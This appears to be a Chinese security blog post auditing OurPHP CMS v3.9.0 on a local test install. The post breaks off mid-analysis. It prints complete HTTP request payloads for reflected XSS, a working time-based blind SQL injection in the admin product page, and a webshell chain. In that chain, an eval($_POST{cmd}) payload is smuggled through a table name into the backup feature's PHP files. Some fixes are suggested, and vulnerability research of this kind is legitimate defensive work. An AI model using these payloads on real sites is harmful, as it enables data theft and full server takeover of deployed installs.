闲来无事看看，经过耐心的跟进与分析，发现了一处很有意思的利用点，与师傅们一起分享一下。

## 环境搭建

gitee上下载，[ourphp企业+商城+小程序万能多国语言建站系统: ourphp企业+商城+小程序万能多国语言建站系统
(gitee.com)](https://gitee.com/ourphp/ourphpcms)，也可在官网下载。

可以在后台看到版本是v3.9.0(20211202)，将zip解压一下，然后安装。

![](./img/1266424547358117196.png)

此CMS在诸多地方采用了自己设计的极为严格的敏感词防护，具有一定效果，但仍存在一点漏洞。鉴于此CMS没有严格采用MVC架构，先尝试用Seay扫一下敏感操作点。

## 前台审计

前台的主要成果是直接扫出几处反射型XSS，没有实际意义，随便看看就好，前面所述的有意思的漏洞在后台。

### wap

先看wap目录下的敏感操作点，在`/client/wap/ourphp_password.class.php`中可能有XSS。

![](./img/5102282871800312184.png)

可以看到一个关键参数是`$temptype`，不过在`ourphpcms/client/wap/ourphp_template.class.php`中没有直接定义，

![](./img/7377835023557551897.png)

试着访问了一下`/client/wap/ourphp_page.class.php`，发现这几个class文件是无法直接访问的，需要通过index.php或search.php中的include才能访问。

两条线索结合一下，结合字符串查找，不难找出`$temptype`的赋值在`ourphpcms/client/wap/ourphp_system.class.php`之中，可以通过`$ourphp_weburl
= explode('-',$_SERVER["QUERY_STRING"]);`这一行进行赋值。

![](./img/6704960008354272206.png)

#### XSS

##### 分析

这里的这个`$ourphp_weburl`是关键点，后面的几个变量都与其有关，

![](./img/2941777975301811318.png)

这里的`$temptype`控制为userpassword.html，与

![](./img/8495128396958089821.png)

这行静态检查的结果对应。接下来跟进到`ourphp_template.class.php`，

![](./img/8771535281523198407.png)

下方有个switch，

![](./img/7196788064388098031.png)

这里是唯一可以正常访问到`ourphp_password.class.php`的点，跟进这个文件。

![](./img/9148382215864628470.png)

这之中有很多变量赋值，不过对我们实际上没有影响，直接向下走，

![](./img/4281657162845530333.png)

进入到这里的判断，可以看到有直接输出。这个CMS的防护机制的思路是涉及到敏感操作时再调用相关函数进行防护，这里显然是没有在意。

payload

    
    
    GET /client/wap/?user=telcode&jsoncallback=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E-userpassword.html HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    

以弹窗检验效果。

![](./img/5235420993363351559.png)

##### 修复

在`/client/wap/ourphp_password.class.php`中的`echo $_GET['jsoncallback'] .
"(".json_encode($msg).")";`加上`htmlspecialchars()`即可。

#### 其它

![](./img/4886497020374386576.png)

这里的几处XFF是渲染到模板里的，没进数据库，应该效果不大。

![](./img/2993248909961619599.png)

这里的这个变量覆盖作用也有限，可能需要深入研究，暂且不表。

### web

![](./img/2891653632852164176.png)

这里有个include，但是后缀名受限制，只能是php，这就要求我们上传php文件，这样的话这个文件包含点就有些鸡肋了，不如直接找文件上传漏洞。

### user

#### XSS1

##### 分析

类似的user里也有可能的XSS漏洞，在`/client/user/ourphp_password.class.php`中，

![](./img/4823580365415848691.png)

同样找到该行，

![](./img/7077408753533901406.png)

`/client/user/ourphp_page.class.php`这几个class文件是无法直接访问的，需要通过index.php、search.php或其它文件中的include才能访问。

两条线索结合一下，结合字符串查找，不难找出合适的对`/client/user/ourphp_page.class.php`文件包含在`client/user/ourphp_template.class.php`之中，

![](./img/4466412686444878001.png)

这里的switch在上面，

![](./img/3204350497584124380.png)

影响的变量是`$temptype`，这个变量的赋值可以通过`$ourphp_weburl =
explode('-',$_SERVER["QUERY_STRING"]);`这一行进行赋值。

![](./img/6655375988820274316.png)

另外再设计好`$_GET['jsoncallback']`为JS语句即可。payload如下，

    
    
    GET /client/user/index.php?user=telcode&jsoncallback=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E-password.html HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; introducer_userid=1; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    

![](./img/3447679538108368826.png)

此处效果为弹窗。

![](./img/8987469427440503100.png)

##### 修复

在`/client/user/ourphp_password.class.php`中的`echo $_GET['jsoncallback'] .
"(".json_encode($msg).")";`加上`htmlspecialchars()`即可。

#### XSS2

##### 分析

![](./img/545238556275603907.png)

在 `/client/user/ourphp_userreg.class.php`中，也有处XSS漏洞。

![](./img/8846739127690554730.png)

这里看起来是两处，实际上只要进入其中一个if就会触发其中的`exit`，所以只能触发一个。

`/client/user/ourphp_userreg.class.php`有检查不能直接访问，

![](./img/1692504598640811930.png)

全局搜索一下这个文件名，

![](./img/1706657536318786220.png)

可以看到是在`/client/user/ourphp_template.class.php`中的一个case里被include，接下来要找如何触发这个case。

这里的switch在上面，

![](./img/787259669150269228.png)

影响的变量是`$temptype`，这个变量的赋值可以通过`$ourphp_weburl =
explode('-',$_SERVER["QUERY_STRING"]);`这一行进行赋值。

![](./img/5089455672545306982.png)

另外再设计好`$_GET['jsoncallback']`为JS语句即可。构造的数据包如下，

    
    
    GET /client/user/index.php?reg=1&code=2&jsoncallback=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E-reg.html HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; introducer_userid=1; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: none
    Sec-Fetch-User: ?1
    

不过遇到一个问题，

![](./img/8567259713508071807.png)

由于此次测试时已经登录，所以这里的session的相关值可能不为空，就会退出。解决方法有二：一是设置这里要求的`$_GET['introducer']`值，二是索性删掉HTTP包里的cookie字段（仅删除掉其中的`introducer_userid=1;`是无效的）。

此处额外添加了参数，即可实现弹窗效果。

![](./img/2829091663602892436.png)

![](./img/6445354400734218355.png)

##### 修复

在 `/client/user/ourphp_userreg.class.php`中的`echo $_GET['jsoncallback'] .
"(".json_encode($msg).")";`加上`htmlspecialchars()`即可。

## 后台审计

### SQL注入

#### 分析

Seay扫出了这个，

![](./img/7599188435687704400.png)

与之类似的还有`/client/manage/ourphp_productedit.php`，

![](./img/5934753062093027709.png)

大体看一下可以发现二者的代码逻辑基本一致，审计其一即可。下面开始对`/client/manage/ourphp_product.php`的审计，这是一个后台文件，需要管理员权限才能访问，

![](./img/2819261991313773686.png)

一开始可以看到一个大的if-elseif，这里我们肯定是要进入`elseif ($_GET["ourphp_cms"] ==
"add")`这个分支的，这个分支才有更多的逻辑操作。

进入这个分支之后，第一个if，即`if ($OP_Class[0] ==
0)`可以不管，跟踪一下可以发现其中的`$ourphp_adminfont`是写死的。

继续向下走，

![](./img/4493473724021830773.png)

可以看到很多地方都是调用了`admin_sql`进行防护的，

![](./img/6748445372278090332.png)

这个防护过滤的关键词很多，不好绕，继续向下审计，不难发现，在到达`$sql = $db -> create("update
ourphp_productspecifications set OP_Value = if(OP_Value like
'%".$cc[$i]."%',OP_Value,CONCAT(OP_Value,'|".$cc[$i]."')) where id =
".$id,2);`这一行之前的数据库操作都有`admin_sql`或者`intval`这样的防护，并不好利用。

接下来是这一行，也是关键点之一，

![](./img/1145227539539306050.png)

这里的关键变量是`$optitleid`，向上追溯可以看到其来源是`$_POST["optitleid"]`这个数组，

![](./img/7690663153252742307.png)

浏览器中访问`/client/manage/ourphp_product.php`，

![](./img/4684412246329782370.png)

可以看到是一个添加商品的页面，随意写点信息提交并抓包，

![](./img/6222660415891022326.png)

添加`optitleid`参数，

![](./img/6935627424157964671.png)

经动态调试发现了一个问题，

![](./img/8736885397100556394.png)

这里还需要POST传一个op参数，否则`optitleid`将被置空，后面就失去作用了。

于是在原来的正常的数据包后加上`&optitleid[]=1'&optitleid[]=2'&op[]=1&op[]=2&op[]=3`，再发包。

此时即可顺利抵达`$sql = $db -> create("update ourphp_productspecifications set
OP_Value = if(OP_Value like
'%".$cc[$i]."%',OP_Value,CONCAT(OP_Value,'|".$cc[$i]."')) where id =
".$id,2);`，

![](./img/4220299231465129422.png)

这里的`$id`参数没有被单引号保护住，所以是注入的关键，此时我们可以看到`$id`为`1'`，这里由于是两层循环，所以这里的`$db->create()`可能会执行多次，

![](./img/7100219131442234229.png)

跟进create函数，可以看到单引号被成功逃逸，当然这里实际上不需要这个单引号，直接写`sleep(5)`这样的时间注入或者根据回显来布尔注入即可（这里不会回显报错，所以无法报错注入；update语句也没法联合注入，盲注是个好的选择）。

漏洞是存在的，但是实际上这个点没法利用，比如我们传`optitleid[]='&optitleid[]=(if(ascii(substr((select%20database()),1,1))>1,sleep(5),0))%23&op[]=1&op[]=2&op[]=3`这样的payload，

![](./img/5374146392402154008.png)

这里有一处`$aa = explode(",",$optitleid);`，会将前面的`$optitleid =
implode(',',$_POST["optitleid"]);`得到的结果拆分开，形成多个数组，我们的一整句payload会被拆散，效果如下，

![](./img/2703459185452799658.png)

这样的话，无论是布尔盲注还是延时注入的payload都会被拆开，实际上无法执行。

继续审计`client/manage/ourphp_product.php`的下半部分，可以看到有一个超长的行，

    
    
    $query = $db -> insert("`ourphp_product`","`OP_Class` = '".$OP_Class[0]."',`OP_Lang` = '".$OP_Class[1]."',`OP_Title` = '".admin_sql($_POST["OP_Title"])."',`OP_Number` = '".admin_sql($_POST["OP_Number"])."',`OP_Goodsno` = '".admin_sql($_POST["OP_Goodsno"])."',`OP_Brand` = '".admin_sql($_POST["OP_Brand"])."',`OP_Market` = '".admin_sql($_POST["OP_Market"])."',`OP_Webmarket` = '".admin_sql($_POST["OP_Webmarket"])."',`OP_Stock` = '".admin_sql($_POST["OP_Stock"])."',`OP_Usermoney` = '".$OP_Usermoney."',`OP_Specificationsid` = '".$optitleid."',`OP_Specificationstitle` = '".$optitle."',`OP_Specifications` = '".$OP_Specifications."',`OP_Pattribute` = '".$OP_Pattribute."',`OP_Minimg` = '".$OP_Minimg."',`OP_Maximg` = '".$OP_Maximg."',`OP_Img` = '".$OP_Img."',`OP_Content` = '".admin_sql($_POST["OP_Content"])."',`OP_Down` = '2',`OP_Weight` = '".intval($_POST["OP_Weight"])."',`OP_Freight` = '".intval($_POST["OP_Freight"])."',`OP_Tag` = '".$wordtag."',`OP_Sorting` = '".admin_sql($_POST["OP_Sorting"])."',`OP_Attribute` = '".$OP_Attribute."',`OP_Url` = '".admin_sql($_POST["OP_Url"])."',`OP_Description` = '".compress_html($OP_Description)."',`time` = '".admin_sql($_POST["time"])."',`OP_Integral` = '".admin_sql($_POST["OP_Integral"])."',`OP_Integralok` = '".admin_sql($_POST["OP_Integralok"])."',`OP_Integralexchange` = '".admin_sql($_POST["OP_Integralexchange"])."',`OP_Suggest` = '".admin_sql($_POST["OP_Suggest"])."',`OP_Productimgname` = '".admin_sql($OP_Productimgname)."',`OP_Usermoneyclass` = '".intval($_POST['OP_Usermoneyclass'])."',`OP_Tuanset` = '".intval($_POST['OP_Tuanset'])."',`OP_Tuanusernum` = '".intval($_POST['OP_Tuanusernum'])."',`OP_Tuantime` = '".admin_sql($_POST['OP_Tuantime'])."',`OP_Couponset` = '".admin_sql($_POST['OP_Couponset'])."',`OP_Buyoffnum` = '".intval($_POST['OP_Buyoffnum'])."'","");
    

大部分的点都有`admin_sql`或者`intval`防护，不过由其中的

    
    
    `OP_Specificationsid` = '".$optitleid."'
    

这部分可以看出，这里是没有严格防护的，单引号的防护可以被绕过，加上如下的payload，

    
    
    optitleid[]='&optitleid[]=`OP_Specificationstitle`=(if(ascii(substr((select%20database()),1,1))>1,sleep(5),0))%23&op[]=1&op[]=2&op[]=3
    

调试分析一下，先看看刚才的create部分，

![](./img/8315928489526323041.png)

`sleep(5)`在这里被拆分出来，

![](./img/1832664287565087718.png)

所以这里就会有一次延时，继续向后走，跟进`$db -> insert`，查看其最终拼接成的sql语句，

![](./img/5539812277107921037.png)

此处成功注入，可以实现延时的效果（第二次延时），

![](./img/5785139261573573426.png)

从测试结果中可以看到，在删除了Cookie中的`XDEBUG_SESSION=PHPSTORM`停止调试之后，延时达到了15秒，类似的也写出脚本进行信息获取，不过要注意写脚本时的判断条件应为2倍时延。

最终数据包如下。

    
    
    POST /client/manage/ourphp_product.php?ourphp_cms=add HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 897
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/client/manage/ourphp_product.php
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; introducer_userid=1; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    
    OP_Class=11%7Ccn&OP_Title=111&OP_Minimg=&OP_Maximg=&OP_Number=OP20230115094805&OP_Goodsno=OP20230115094805&OP_Market=0.00&OP_Webmarket=0.00&OP_Usermoneyclass=1&OP_Userj%5B%5D=1&OP_Userj%5B%5D=0.00&OP_Userj%5B%5D=%7C&OP_Userj%5B%5D=2&OP_Userj%5B%5D=0.00&OP_Userj%5B%5D=%7C&OP_Userj%5B%5D=3&OP_Userj%5B%5D=0.00&OP_Userj%5B%5D=%7C&OP_Userj%5B%5D=4&OP_Userj%5B%5D=0.00&OP_Userj%5B%5D=%7C&OP_Userj%5B%5D=5&OP_Userj%5B%5D=0.00&OP_Userj%5B%5D=%7C&OP_Brand=0&OP_Stock=100&select=0&OP_Weight=1&OP_Freight=1&OP_Sorting=99&OP_Url=&OP_Tag=&OP_Description=&OP_Integral=0.00&OP_Integralok=0&OP_Integralexchange=0.00&OP_Tuanset=1&OP_Tuanusernum=0&OP_Tuantime=&OP_Couponset=0&OP_Buyoffnum=0&OP_Suggest=&time=2023-01-15+09%3A48%3A05&OP_Content=&OP_Img=&submit=%E6%8F%90+%E4%BA%A4&optitleid[]='&optitleid[]=`OP_Specificationstitle`=(if(ascii(substr((select%20database()),1,1))>1,sleep(5),0))%23&op[]=1&op[]=2&op[]=3
    

#### 修复

将`$optitle`改为`admin_sql($optitle)`。

### SQL注入2（失败）

这里的SQL注入闭合掉了`，但受限于无法执行多语句，所以没能成功，将数据包与最终的效果直接贴出，感兴趣的师傅可以自行分析一下。

    
    
    POST /client/manage/ourphp_bakgo.php?&framename=main HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 494
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/client/manage/ourphp_bakgo.php?&framename=main
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; introducer_userid=1; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: frame
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    
    faisunsql_postvars=AAkDW0kSCARQXxpeQFhfA0ZdRQlUClJdREQNCA8IBAdaQA9WCENWVzsNV0tGGwkVCAsPQ10MVlRcDlkSQRMPRFsCBFsQBVBqERZdSlxYXwMQCUZbBVkXR18JQkMOQg4GUAkXBVA%2BQlQXFk9XQF0QXUEIAVsTEVpaREQNEg8IDhUFUWoFUA9TWAFHA0sIDwhEXUdHEVkTFw5DXAdSDxNZThJCWT5EBEBGDQpWGglKCFAIEABPBk0HAxJdSw%3D%3Deedd6c4b1d&fsqltable%5Bourphp_ad%5D=2636%2C73&fsqltable%5Bourphp_admin%5D=2272%2C224&tabledumping=0&action=databackup&back_type=partsave&dosubmit=%E4%B8%8B%E4%B8%80%E6%AD%A5&dir=../../function/backup/2023011511&page=1
    
    
    
    SHOW CREATE TABLE `ourphp_ad`;select/**/sleep(5);#ourphp_admin`
    

### 后台写文件getshell

此处漏洞是我在本次审计过程中发现的比较有意思的点，本来没以为这是一处漏洞，但是经过耐心跟随与绕过，最终理清了利用思路：备份数据库文件配合文件包含getshell。

#### 写文件

Seay扫描的相关结果如下，

![](./img/2182855969143456000.png)

实际上，这里一看有点像假的点，毕竟Seay的作用主要是发现敏感操作点而已，像这种写文件/包含文件的点大都是误报。不过本CMS中，这样的点实际上并不多，好奇心驱使着我继续探索，经过深入研究发现，经过二者的组合，这里的漏洞点是可以发挥效果的，先看`fwrite($fp,$data);`。

`/client/manage/ourphp_bakgo.php`中的`writefile`函数如下，

    
    
    function writefile($data,$method='w'){
        global $fsqlzip,$_POST;;
        $file = "{$_POST[filename]}_pg{$_POST[page]}.php";
        $fp=fopen("$_POST[dir]/$file","$method");
        flock($fp,2);
        fwrite($fp,$data);
    }
    

可以看到这里有比较明显的写文件操作，而且是写文件名可控的PHP文件，向上追溯调用了`writefile`的点，

![](./img/1539967897143895986.png)

有两处，第二处的参数`$data`是写死的，不好利用，第一处在`dealdata`函数中，

    
    
    function dealdata($data){
        global $current_size,$tablearr,$writefile_data,$_POST;;
        $current_size += strlen($data);
        $writefile_data .= $data;
        if($current_size>=intval($_POST["filesize"])*1024){
            $current_size=0;
            $writefile_data .= "\r\n?".">";
    
            writefile($writefile_data,"w");
    
            $_POST[page]=intval($_POST[page])+1;
    
            fheader();
            echo tablestart("正在从数据库'$_POST[db_dbname]'中导出数据……","98%");
            ...
                exit();
        }
    }
    

继续向上跟进`dealdata`函数，共有4处，都在`sqldumptable`函数中，其中好用的是第一处，

    
    
    function sqldumptable($table,$tableid,$part=0) {
        if($part) global $lastcreate_temp,$current_size,$_POST,$db,$ourphp;
    
        //structure
        if($tableid >= intval($_POST[nextcreate]) or $part==0){
            @$query = $db -> create("SET SQL_QUOTE_SHOW_CREATE = 1",2);
            $query = $db -> create("SHOW CREATE TABLE `$table`",2);
            $row = $db -> whilego($query);
            $sql = str_replace("\n","\\n",str_replace("\"","\\\"",$row[1]));
            $sql = preg_replace("/^(CREATE\s+TABLE\s+`$table`)/mis","",$sql);
            $dumpstring = "create(\"$table\",\"$sql\");\r\n\r\n";
            $_POST[nextcreate]++;
            dealdata($dumpstring);
        }
        ...
    

继续向上跟进`sqldumptable`函数，在`/client/manage/ourphp_bakgo.php`中只有如下这一处调用，

![](./img/245823752611597540.png)

可以看到，这里的两个关键变量为：`$_POST[tabledumping]`和`$tablearr`，`$_POST[tabledumping]`为直接可控的，`$tablearr`向上追溯可以发现来自`$_POST[fsqltable]`，实际上也是可控的。

后台访问`http://127.0.0.1/client/manage/ourphp_bakgo.php`，可以看到这个页面的功能是备份数据表。

![](./img/8471519640894593266.png)

点击页面最下方的”下一步“并抓包，可以看到有一个POST参数：fsqltable，这是一个数组，其键名为这个页面中展示的诸如`ourphp_admin`这样的表名，最终会在代码中转为`$tablearr`参数并传入`sqldumptable`函数。

有了这些信息，我们再回过头来看`sqldumptable`函数，

![](./img/4209582583192622307.png)

这里的`$table`变量经拼接后传入`dealdata`函数，

![](./img/8069708791275650775.png)

做了一些拼接后，将字符串写入文件，写文件`/function/backup/2023011517/index_pg1.php`（备份文件名）的效果如下，

![](./img/5285655486725532583.png)

可以看到这里除了有在`sqldumptable`函数中看到的`create()`函数，还有一些不可控的前缀和后缀，后缀是`"\r\n?".">"`这样的字符串，不用太关注，重点需要关注前缀`if(!defined('VERSION')){echo
"<meta http-equiv=refresh
content='0;URL=index.php'>";exit;}`，这起到了很好的限制作用，就算我们写入了shell，直接访问shell时也会因为没有定义`VERSION`这个常量而exit，导致无法利用webshell。

#### 文件包含

想要破解这个问题，就要找到一个文件，其中定义了`VERSION`这个常量，并且能够利用include来进行文件包含，经过搜索，`client/manage/ourphp_bakgo.php`可以间接满足条件，

![](./img/1257733059466472897.png)

![](./img/3623058006278013448.png)

这里的`$data`参数是引导文件的内容，其中有`define("VERSION","'.VERSION.'");`来定义了`VERSION`这个常量，

![](./img/7365311600358437801.png)

`$data`中也有一处可控的文件包含点，接下来`$data`被写入文件，这个文件名也可控。

![](./img/105313877500479540.png)

`$data`被写入的这个文件，就是破题的关键，有了它，就能将我们写入的webshell真正的用起来。

接下来我们需要获得一个这样的辅助文件，先进行正常的备份请求，

![](./img/3331138308397959071.png)

得到如下页面，

![](./img/6888667816695824091.png)

这里需要设置一个数据导入密码，在访问导入功能的页面时需要输入这个密码，

![](./img/5368316596614518328.png)

接下来就是一个提示，

![](./img/4738578313673812651.png)

查看文件，

![](./img/7670112402722872584.png)

![](./img/7753005113179906784.png)

可以看到已经具备了我们需要的两个关键点：`define("VERSION","1.1");`和`include("index_pg$_POST[loadpage].php");`，此时可以利用webshell。

#### 写webshell

正式利用之前，还需要解决一个问题，受限于写文件的点，我们写入的webshell的格式是这样的。

![](./img/7522138673091271057.png)

在调用我们的`eval()`之前，必定会调用`create`函数，若是直接访问webshell，则可能会因不存在`create`函数而报一个warning，但我们是通过起到备份数据表功能的文件`function/backup/2023011522/index.php`来调用的这个webshell，而这个起到备份数据表功能的文件中是定义了`create`函数的。

    
    
    function query($sql){
        global $_POST,$db;
        if(!$db -> create($sql,2)){
            echo "<BR><BR><font color=red>MySQL语句错误！您可能发现了程序的BUG！<a href=\"http://www.ourphp.net\" target=\"_blank\">请报告开发者。</a>
                        <BR>版本：V1.1<BR>语句：<XMP>$sql</XMP>错误信息： ".$db -> error()." </font>" ;
            if(trim($_POST[db_temptable])) query("DROP TABLE IF EXISTS `$_POST[db_temptable]`;");
            exit;
        }
    }
    function create($table,$sql){
        global $_POST,$db;
        if(!trim($_POST[db_temptable])){
            do{
                $_POST[db_temptable]="_ourphp_sql".rand(100,10000);
            }while(@$db -> create("select * from `$_POST[db_temptable]`",2));
        }
        query("CREATE TABLE `$_POST[db_temptable]` $sql");
        if(!$_POST[db_safttemptable]) query("DROP TABLE IF EXISTS `$table`;");
    }
    

这里有个<font
color=red>非常致命</font>的点，就是`query`函数中的`exit`，如果触发了`exit`，整个程序就会退出，我们的webshell仍然失效。分析一下代码逻辑，可以看到`create`中调用了`query`，`query`中如果`$db
-> create($sql,2)`为`false`，即`$db -> create($sql,2)`执行失败，则会触发`exit`。

为了不触发`exit`，我们要秉持如下的原则：1、尽量少的执行SQL语句，多一次执行就多一次犯错的机会；2、尽量保证SQL语句在语法上是正确的。为了尽量少的执行SQL语句，在访问`function/backup/2023011522/index.php`进行调用webshell时，我们可以让`$_POST[db_temptable]`和`$_POST[db_safttemptable]`不为空，不过关键点还是要让`query`中的`$db
-> create($sql,2)`执行成功，而`query($sql)`中的`$sql`是

    
    
    ("CREATE TABLE `$_POST[db_temptable]` $sql")

实际上这之中的`$sql`是我们写文件可控的，

![](./img/8888612234688215659.png)

所以我们可以令`$_POST[db_temptable]`为一个表名，同时令`create`的第一个参数为一个表名且第二个参数（$sql）为`(Id_P
int)`以拼接成一句完整的SQL语句。

调用webshell的干扰解决了，我们将正常的向`/client/manage/ourphp_bakgo.php`的备份请求的数据包进行更改，得到写入webshell的第一代payload如下，

    
    
    POST /client/manage/ourphp_bakgo.php?&framename=main HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 499
    Origin: http://127.0.0.1
    Connection: close
    Referer: http://127.0.0.1/client/manage/ourphp_bakgo.php?&framename=main
    Cookie: PHPSESSION=kcais6rfp5ouj448jrrnouql94; PHPSESSID=bjbqt41a1gcls71rf8q81i3lq3; introducer_userid=1; XDEBUG_SESSION=PHPSTORM
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: frame
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    
    faisunsql_postvars=WQIFCx1LDFAAWEFWRgMPU0MOQV9VWVQLQRQNCAwPBwgDSwkGXBpSA2sKDENAQFlFDVgLFVxfUAJZXlkSQhQMSwIJAgtEXFQ%2BQREGQloDD1MVWkINBAoREVpZQkMNRQ0JCQIRVQRnRgBHERRfRgZADURbBQ0SQlwMQRQNEgwPDRpcWmxVBFZXDFFAWEMOVFgUWBRDR1hAEVhGDAdSDBRaQUtJX24QXUQSXQ0NEg8RWAANQwQZBx4BVRcNSw%3D%3Deedd6c4b1d&fsqltable%5Bourphp_ad`%23","(Id_P int)");eval($_POST{cmd});%23%5D=2272%2C224&tabledumping=0&action=databackup&back_type=partsave&dosubmit=%E4%B8%8B%E4%B8%80%E6%AD%A5&dir=../../function/backup/202301151194&page=1
    

其中，

    
    
    faisunsql_postvars=WQIFCx1LDFAAWEFWRgMPU0MOQV9VWVQLQRQNCAwPBwgDSwkGXBpSA2sKDENAQFlFDVgLFVxfUAJZXlkSQhQMSwIJAgtEXFQ%2BQREGQloDD1MVWkINBAoREVpZQkMNRQ0JCQIRVQRnRgBHERRfRgZADURbBQ0SQlwMQRQNEgwPDRpcWmxVBFZXDFFAWEMOVFgUWBRDR1hAEVhGDAdSDBRaQUtJX24QXUQSXQ0NEg8RWAANQwQZBx4BVRcNSw%3D%3Deedd6c4b1d

这一段算是管理员的口令，是自动生成的，我们保持住即可，不用特别关注；

    
    
    fsqltable%5Bourphp_ad`","(Id_P int)");eval($_POST{cmd});%23%5D=2272%2C224

这一段是核心，就是表名，在上面的小节的分析中我们可以看到这里将被写入php文件，这里有一点小细节，就是`fsqltable%5B%5D`解码后实是`fsqltable[]`，就是说POST中的`fsqltable`变量是个数组，为了避免与`fsqltable[]`的括号碰撞，我在`$_POST{cmd}`没有使用`[]`，而是使用的`{}`（当然这个细节也可能是多此一举）。

正片开始，跟踪分析一下，

![](./img/8082231505395568139.png)

由于传了`action=databackup`这样的参数，会进入这个分支，

接下来进入`if($_POST[back_type]=="partsave")`这一部分 ，

![](./img/4861559080310166969.png)

继续向下走，会有创建目录的操作，

![](./img/8155811588947072036.png)

这个无需关注，继续向下会有一个小拦路虎，

![](./img/3369829107979852664.png)

这里会检查`$_POST[dir]`这个目录，如果其中已经有备份文件，则会报错，就无法执行后面的代码了，所以我们要控制`$_POST[dir]`为一个未使用过的目录名，如这里的`dir=../../function/backup/202301151194`就是在正常生成的文件名`../../function/backup/2023011511`之后多加了`94`这两个字符。

继续跟进，

![](./img/4629785356646513240.png)

这里拼接了前面提到的`if(!defined('VERSION')){echo "<meta http-equiv=refresh
content='0;URL=index.php'>";exit;}`这个校验，并将我们的参数

    
    
    fsqltable%5Bourphp_ad`","(Id_P int)");eval($_POST{cmd});%23%5D=2272%2C224

传入`sqldumptable`函数，继续跟进，

![](./img/1535168422237934585.png)

一个小插曲是，这里虽然有`$db->create()`，也就是ourphp中的数据库操作，而且`$table`变量也是完全可控的，但是这里并不便于SQL注入，原因如下，

![](./img/7248854558307303608.png)

跟进可以看到，这里调用的是`mysqli_query`，只能执行单语句，就算闭合了这个反引号，也无法注入第二句，再加上这里完全没有回显，得考虑时间盲注，但`SHOW
CREATE TABLE`这样的语句也不便于盲注，所以就不再关注这个SQL查询，重点关注代码执行，跟进`dealdata($dumpstring);`，

![](./img/2936246579431010289.png)

继续跟进`writefile($writefile_data,"w");`，

![](./img/4520277286179805636.png)

